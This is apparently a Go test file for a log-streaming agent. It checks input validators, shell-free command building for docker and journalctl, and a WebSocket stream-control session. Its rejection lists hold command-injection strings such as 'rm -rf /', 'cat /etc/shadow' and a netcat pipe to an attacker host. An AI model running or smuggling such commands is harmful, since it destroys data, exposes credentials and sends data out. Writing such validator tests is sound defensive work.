package logstream

import (
	"bufio"
	"context"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/infralab/infralab/agent/internal/identity"
)

func TestValidateContainerID_PreventsCommandAndFlagInjection(t *testing.T) {
	valid := []string{
		"nginx",
		"infralab-redis-1",
		"a1b2c3d4e5f6",
		"my_app.service-container_01",
	}
	for _, id := range valid {
		if err := ValidateContainerID(id); err != nil {
			t.Fatalf("expected valid container ID %q, got error: %v", id, err)
		}
	}

	invalid := []string{
		"",
		"   ",
		"-f",
		"--help",
		"nginx; rm -rf /",
		"nginx && cat /etc/shadow",
		"nginx | nc attacker.example 4444",
		"$(whoami)",
		"`id`",
		"container with spaces",
		"../etc/passwd",
	}
	for _, id := range invalid {
		if err := ValidateContainerID(id); err == nil {
			t.Fatalf("expected invalid container ID %q to be rejected", id)
		}
	}
}

func TestValidateUnitName_PreventsCommandAndFlagInjection(t *testing.T) {
	valid := []string{
		"",
		"sshd",
		"sshd.service",
		"docker.service",
		"user@1000.service",
	}
	for _, u := range valid {
		if err := ValidateUnitName(u); err != nil {
			t.Fatalf("expected valid unit %q, got error: %v", u, err)
		}
	}

	invalid := []string{
		"-u",
		"--system",
		"nginx;id",
		"nginx && whoami",
		"sshd; reboot",
		"sshd | sh",
		"$(id)",
		"../../etc/passwd",
		"unit..traversal",
	}
	for _, u := range invalid {
		if err := ValidateUnitName(u); err == nil {
			t.Fatalf("expected invalid unit %q to be rejected", u)
		}
	}

	if _, err := ValidatePriority("err"); err != nil {
		t.Fatalf("expected valid priority 'err', got: %v", err)
	}
	if _, err := ValidatePriority("invalid_prio;id"); err == nil {
		t.Fatal("expected invalid priority to be rejected")
	}
	if err := ValidateSince("10m"); err != nil {
		t.Fatalf("expected valid since '10m', got: %v", err)
	}
	if err := ValidateSince("--help"); err == nil {
		t.Fatal("expected flag in since to be rejected")
	}
	if err := ValidateSince("2026-01-01; whoami"); err == nil {
		t.Fatal("expected command injection in since to be rejected")
	}
}

func TestRunnerStream_DockerStdoutStderrAndOversizedLine(t *testing.T) {
	runner := NewRunner("agt_docker_test")
	runner.CmdFactory = func(ctx context.Context, _ string, _ ...string) *exec.Cmd {
		return exec.CommandContext(
			ctx,
			"python3",
			"-u",
			"-c",
			`import sys
sys.stdout.write("2026-10-01T12:00:01.000000000Z stdout normal line\n")
sys.stderr.write("2026-10-01T12:00:02.000000000Z stderr error message\n")
sys.stdout.write("2026-10-01T12:00:03.000000000Z " + ("A" * 20000) + "\n")
sys.stdout.flush()
sys.stderr.flush()
`,
		)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var mu sync.Mutex
	var events []LogEvent

	err := runner.Stream(ctx, StreamRequest{
		StreamID:      "d1",
		Source:        "docker",
		ContainerID:   "redis-cache",
		ContainerName: "redis-cache",
		Tail:          20,
	}, func(ev LogEvent) {
		mu.Lock()
		events = append(events, ev)
		mu.Unlock()
	})
	if err != nil {
		t.Fatalf("unexpected stream error: %v", err)
	}

	mu.Lock()
	defer mu.Unlock()
	if len(events) != 3 {
		t.Fatalf("expected 3 events (stdout, stderr, oversized), got %d", len(events))
	}

	var hasStdout, hasStderr, hasTruncated bool
	for _, ev := range events {
		if ev.Source != "docker" || ev.ContainerID != "redis-cache" {
			t.Fatalf("unexpected container metadata: %+v", ev)
		}
		if ev.Stream == "stdout" && strings.Contains(ev.Message, "stdout normal line") {
			hasStdout = true
		}
		if ev.Stream == "stderr" && ev.Level == "error" && strings.Contains(ev.Message, "stderr error message") {
			hasStderr = true
		}
		if strings.Contains(ev.Message, "[truncated") && len(ev.Message) < 17000 {
			hasTruncated = true
		}
	}
	if !hasStdout || !hasStderr || !hasTruncated {
		t.Fatalf("missing expected docker events: stdout=%v stderr=%v truncated=%v", hasStdout, hasStderr, hasTruncated)
	}
}

func TestBuildCommandArgs_NoShellInterpolation(t *testing.T) {
	bin, args, normSource, unit, err := BuildCommandArgs(StreamRequest{
		Source: "journald",
		Unit:   "sshd.service",
		Tail:   100,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if bin != "journalctl" {
		t.Fatalf("expected binary journalctl, got %q", bin)
	}
	if normSource != "journal" || unit != "sshd.service" {
		t.Fatalf("unexpected source/unit: %s / %s", normSource, unit)
	}
	for _, a := range args {
		if a == "sh" || a == "-c" || a == "bash" {
			t.Fatalf("command args must never invoke a shell: %v", args)
		}
	}

	bin2, args2, normSource2, _, err := BuildCommandArgs(StreamRequest{
		Source:      "docker",
		ContainerID: "redis-cache-01",
		Tail:        50,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if bin2 != "docker" || normSource2 != "docker" {
		t.Fatalf("expected docker binary/source, got %s / %s", bin2, normSource2)
	}
	expectedDockerArgs := "logs --follow --timestamps --tail 50 redis-cache-01"
	if strings.Join(args2, " ") != expectedDockerArgs {
		t.Fatalf("expected args %q, got %q", expectedDockerArgs, strings.Join(args2, " "))
	}
}

func TestRunnerStream_JournalAndCleanProcessTermination(t *testing.T) {
	runner := NewRunner("agt_test_123")
	runner.CmdFactory = func(ctx context.Context, _ string, _ ...string) *exec.Cmd {
		// Emit two journalctl short-iso lines then block until SIGTERM
		return exec.CommandContext(
			ctx,
			"python3",
			"-u",
			"-c",
			`import sys, time
sys.stdout.write("2026-10-01T12:00:01+0000 node-01 sshd[1024]: Accepted publickey for root\n")
sys.stdout.write("2026-10-01T12:00:02+0000 node-01 sshd[1024]: Failed password for invalid user admin\n")
sys.stdout.flush()
time.sleep(30)
`,
		)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var mu sync.Mutex
	var events []LogEvent

	done := make(chan error, 1)
	go func() {
		done <- runner.Stream(ctx, StreamRequest{
			StreamID: "s1",
			Source:   "journal",
			Unit:     "sshd",
			Tail:     20,
		}, func(ev LogEvent) {
			mu.Lock()
			events = append(events, ev)
			if len(events) >= 2 {
				cancel()
			}
			mu.Unlock()
		})
	}()

	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("expected clean nil exit on context cancel, got: %v", err)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for stream subprocess to terminate after cancel")
	}

	mu.Lock()
	defer mu.Unlock()
	if len(events) != 2 {
		t.Fatalf("expected 2 events, got %d", len(events))
	}
	if events[0].Source != "journal" || events[0].Unit != "sshd" || events[0].Level != "info" {
		t.Fatalf("unexpected first event: %+v", events[0])
	}
	if events[1].Level != "error" || !strings.Contains(events[1].Message, "Failed password") {
		t.Fatalf("unexpected second event: %+v", events[1])
	}
}

func TestAgentStreamSession_BidirectionalWebSocketControlAndEvents(t *testing.T) {
	receivedEvents := make(chan OutgoingFrame, 32)
	serverCtrlCh := make(chan ControlMessage, 8)

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/agents/logs/ws" {
			http.NotFound(w, r)
			return
		}
		if r.Header.Get("X-Agent-ID") != "agt_ws_01" {
			http.Error(w, "missing agent id", http.StatusUnauthorized)
			return
		}
		hj, ok := w.(http.Hijacker)
		if !ok {
			http.Error(w, "hijack not supported", http.StatusInternalServerError)
			return
		}
		wsKey := r.Header.Get("Sec-WebSocket-Key")
		h := sha1.New()
		_, _ = h.Write([]byte(wsKey + wsGUID))
		accept := base64.StdEncoding.EncodeToString(h.Sum(nil))

		conn, bufrw, err := hj.Hijack()
		if err != nil {
			return
		}
		defer conn.Close()

		resp := fmt.Sprintf(
			"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: %s\r\n\r\n",
			accept,
		)
		_, _ = bufrw.WriteString(resp)
		_ = bufrw.Flush()

		// Writer goroutine for server -> agent control messages
		go func() {
			for ctrl := range serverCtrlCh {
				data, _ := json.Marshal(ctrl)
				frame := []byte{0x81}
				if len(data) <= 125 {
					frame = append(frame, byte(len(data)))
				} else {
					frame = append(frame, 126, byte(len(data)>>8), byte(len(data)))
				}
				frame = append(frame, data...)
				_, _ = conn.Write(frame)
			}
		}()

		// Reader loop for agent -> server frames
		br := bufio.NewReader(bufrw)
		for {
			b0, err := br.ReadByte()
			if err != nil {
				return
			}
			b1, err := br.ReadByte()
			if err != nil {
				return
			}
			_ = b0
			masked := (b1 & 0x80) != 0
			length := int(b1 & 0x7F)
			if length == 126 {
				ext := make([]byte, 2)
				if _, err := io.ReadFull(br, ext); err != nil {
					return
				}
				length = int(binary.BigEndian.Uint16(ext))
			}
			var maskKey []byte
			if masked {
				maskKey = make([]byte, 4)
				if _, err := io.ReadFull(br, maskKey); err != nil {
					return
				}
			}
			payload := make([]byte, length)
			if _, err := io.ReadFull(br, payload); err != nil {
				return
			}
			if masked {
				for i := 0; i < length; i++ {
					payload[i] ^= maskKey[i%4]
				}
			}
			var out OutgoingFrame
			if err := json.Unmarshal(payload, &out); err == nil {
				receivedEvents <- out
			}
		}
	}))
	defer srv.Close()

	runner := NewRunner("agt_ws_01")
	runner.CmdFactory = func(ctx context.Context, _ string, _ ...string) *exec.Cmd {
		return exec.CommandContext(
			ctx,
			"python3",
			"-u",
			"-c",
			`import sys, time
sys.stdout.write("2026-10-01T12:10:00Z container started ready\n")
sys.stdout.flush()
time.sleep(30)
`,
		)
	}

	id := &identity.Identity{
		ServerURL:  srv.URL,
		AgentID:    "agt_ws_01",
		AuthMode:   "bearer",
		Credential: "sec_test",
	}
	session := NewAgentStreamSession(srv.URL, id, runner, nil)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		_ = session.ConnectAndServe(ctx)
	}()

	// 1. Expect initial hello frame
	select {
	case frame := <-receivedEvents:
		if frame.Type != "hello" || frame.AgentID != "agt_ws_01" {
			t.Fatalf("expected hello frame from agent, got %+v", frame)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for agent hello frame")
	}

	// 2. Send start_stream command for docker container
	serverCtrlCh <- ControlMessage{
		Type:        "start_stream",
		StreamID:    "docker_stream_1",
		Source:      "docker",
		ContainerID: "nginx-web",
		Tail:        10,
	}

	var gotLog bool
	timeout := time.After(4 * time.Second)
	for !gotLog {
		select {
		case frame := <-receivedEvents:
			if frame.Type == "log_event" && frame.Event != nil {
				if frame.Event.Source != "docker" || frame.Event.ContainerID != "nginx-web" {
					t.Fatalf("unexpected log event metadata: %+v", frame.Event)
				}
				if !strings.Contains(frame.Event.Message, "container started ready") {
					t.Fatalf("unexpected log event message: %+v", frame.Event)
				}
				gotLog = true
			}
		case <-timeout:
			t.Fatal("timed out waiting for docker log_event over websocket")
		}
	}

	// 3. Send stop_stream command and verify stopped status
	serverCtrlCh <- ControlMessage{
		Type:     "stop_stream",
		StreamID: "docker_stream_1",
	}

	var gotStopped bool
	stopTimeout := time.After(3 * time.Second)
	for !gotStopped {
		select {
		case frame := <-receivedEvents:
			if frame.Type == "stream_status" && frame.StreamID == "docker_stream_1" && frame.Status == "stopped" {
				gotStopped = true
			}
		case <-stopTimeout:
			t.Fatal("timed out waiting for stream_status=stopped")
		}
	}
}
